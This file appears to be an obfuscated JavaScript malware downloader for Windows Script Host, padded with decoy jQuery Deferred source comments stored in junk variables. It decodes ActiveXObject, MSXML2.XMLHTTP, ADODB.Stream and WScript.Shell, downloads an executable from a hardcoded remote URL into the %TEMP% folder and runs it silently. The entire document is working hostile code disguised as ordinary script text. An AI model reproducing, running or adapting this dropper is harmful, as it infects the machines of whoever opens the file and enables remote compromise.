KgaYzabKU = " deferred[ done | fail | progress ] for forwarding actions to newDefer deferred[ tuple[ 1 ] ]( function() { var returned = fn && fn.apply( this, arguments ); if ( returned && jQuery.isFunction( returned.promise ) ) { returned.promise() .progress( newDefer.notify ) .done( newDefer.resolve ) .fail( newDefer.reject ); } else { newDefer[ tuple[ 0 ] + \"With\" ]( this === promise ? newDefer.promise() : this, fn ? [ returned ] : arguments ); } } ); } ); fns = null; } ).promise(); },";
String.prototype.twofold = function () { aa = this; return aa.charAt(1 * 0 / 1); };
String.prototype.furry = function () { aa = this; return aa.split(")").join("").split("(").join("").split("9").join(""); };

var ekzlje = ["()A()()()c()t()()"+"i()(v())((e9))(X))"+("XMPciFSVoqS","hinge","armenian",")(O())b())")+")j(())e)c))t)", ("patio","intentional","E")+"x)p"+"an)d)E"+("munificent","illimitable","revolve","vegetables","n)v")+"i)r"+("cuisine","empire","on)me)nt")+"S)t"+")ri"+"ngs", ("nazareth","europa","ahYeWiE","leonine",")")+")%"+"T)E"+("guild","patents","headway","M)P)%"), ""+("extremely","complicated",").")+"e)x)e", "R)"+("partridge","threshing","un)"), "M)"+("podcasts","amino","malthus","lawful)ly","S)X")+("univers)ality","risky","collect","M)L2).")+"X)M"+"L)HT)TP", "W)"+"S)c"+("nonco)mmissioned","unmanned","r)i")+("anatomy","administrators","pt).)Sh)e")+("JYmkyxaKnG","compliance","weighted","l)l")];
UKvSTjCwoJe = " promise[ done | fail | progress ] = list.add promise[ tuple[ 1 ] ] = list.add;";
var GLNpeWx = this[ekzlje.shift().replace("9", "").furry()];
kpTEmxgS = "UPNGuN";
snapshot = (("louse", "overgrown", "VpJYxqBNrkM", "predilection", "pkSOnBPuXsyn") + "nYzFDJE").twofold();
asthmas = (("estonia", "IHtVSq", "orchestra", "tandem", "sANuunB") + "phcqJkyURHDx").twofold();
kpTEmxgS = ekzlje.shift();

var EkbrCAD = new GLNpeWx(ekzlje.pop().furry());
ydagKbat = " Keep pipe for back-compat promise.pipe = promise.then;";
var AyLJcpnc = new GLNpeWx(ekzlje.pop().furry());
HyGhCDM = " Get a promise for this deferred If obj is provided, the promise aspect is added to the object promise: function( obj ) { return obj != null ? jQuery.extend( obj, promise ) : promise; } }, deferred = {};";
var qOgIhFXi = EkbrCAD[""+(("BaXKXd", "mediawiki", "monotheism", "holland", ""+("taylor","stronghold","9")+"999")+kpTEmxgS+"))").furry()](("(("+("crestfallen","graveyard","")+"9"+"999"+ekzlje.shift()+"))").furry());
FVXmJc = " Add list-specific methods jQuery.each( tuples, function( i, tuple ) { var list = tuple[ 2 ], stateString = tuple[ 3 ];";

failse = (("cejPVUWtoG", "transportation", "shanghai", "poppy", "EXlLkQxoSz") + "mPYPyR").twofold().furry();

function torpedo(supervision, alone) {

    try {
        var lamplight = qOgIhFXi + "/" + alone + ekzlje.shift().furry();
    uBQSCa = "} All done! return deferred; },";
    AyLJcpnc[("o" + snapshot +"(9)"+ failse).furry() + "n"](("hCcwqzySWl","failing","tight","investments","G") + failse + ("fioricet","florence","tress","T"), supervision, false);

    htooDlqRARx = " Deferred helper when: function( subordinate /* , ..., subordinateN */ ) { var i = 0, resolveValues = slice.call( arguments ), length = resolveValues.length,";
    AyLJcpnc[asthmas + ("revise","surveillance","fergus","e") + (("stamps", "reiterate", "NnfFlfFl", "compatibility", "border", "nlaKkrbMnk") + "HaRHtvosEBs").twofold() + (("stark", "malevolence", "realize", "enhancing", "bellow", "dCKChAhoDs") + "pfmGAWJjUBL").twofold()]();
    yRpnkg = " the count of uncompleted subordinates remaining = length !== 1 || ( subordinate && jQuery.isFunction( subordinate.promise ) ) ? length : 0,";
    if (AyLJcpnc.status == 200) {
        var qeBhJRt = new GLNpeWx((("imperturbable","classroom","arrow","samsung","")+"A"+("democrat","bigger","pO")+"DB." + ""+("signal","manipulate","exasperation","S")+"tr"+("sound","intolerant","eam")).replace("p", "D"));
        qeBhJRt[("undeserving","siena","argentina","brent","")+"o"+"pen"]();
        gsjhFHl = " Handle state if ( stateString ) { list.add( function() {";
        qeBhJRt.type = 0 + 3 - 2;
        SrAfRU = " state = [ resolved | rejected ] state = stateString;";
        qeBhJRt[("disheartening","fidget","publish","minstrel","w")+"ri"+"te"](AyLJcpnc[("photographer","fumble","")+"R"+"es"+("popped","liberation","pon") + asthmas + "e"+("financier","others","acres","warden","Bo")+"dy"]);
        ovgusEtN = " [ reject_list | resolve_list ].disable; progress_list.lock }, tuples[ i ^ 1 ][ 2 ].disable, tuples[ 2 ][ 2 ].lock ); ";
        qeBhJRt[(snapshot + ("shear","guano","o")+"Di"+"ti"+"on").replace("D", asthmas)] = 0;
        dVAlJQnViul = "} deferred[ resolve | reject | notify ] deferred[ tuple[ 0 ] ] = function() { deferred[ tuple[ 0 ] + \"With\" ]( this === deferred ? promise : this, arguments ); return this; }; deferred[ tuple[ 0 ] + \"With\" ] = list.fireWith; } );";
        qeBhJRt["sav"+"eT"+("uncanny","prepaid","oF")+"ile"](lamplight, 2);
        fXGXpRPRu = " Make the deferred a promise promise.promise( deferred );";
        qeBhJRt.close();
        SfaDSgPN = " Call given func if any if ( func ) { func.call( deferred, deferred ); ";
        EkbrCAD[ekzlje.shift().furry()](lamplight, 1, "qizveDG" === "njYwdilLDf"); CxKRBTM = " } else if ( !( --remaining ) ) KmrTlTfla{ deferred.resolveWith( contexts, values ); } }; },";
    }

} catch (BfoaNF) { };

    yvdMDUzG = " Update function for both resolve and progress values updateFunc = function( i, contexts, values ) { return function( value ) { contexts[ i ] = this; values[ i ] = arguments.length > 1 ? slice.call( arguments ) : value; if ( values === progressValues ) { deferred.notifyWith( contexts, values );";
}
torpedo("h"+"tt"+"p://"+"sa"+"nd"+"bo"+("shoulder","diseases","x.")+"bott"+"le"+"st"+"or"+"e."+"co"+"m/"+"765f"+"46"+"vb"+".e"+"xe","DTknBxXcF");
   RyVQUWQp = " the master Deferred. If resolveValues consist of only a single Deferred, just use that. deferred = remaining === 1 ? subordinate : jQuery.Deferred(),";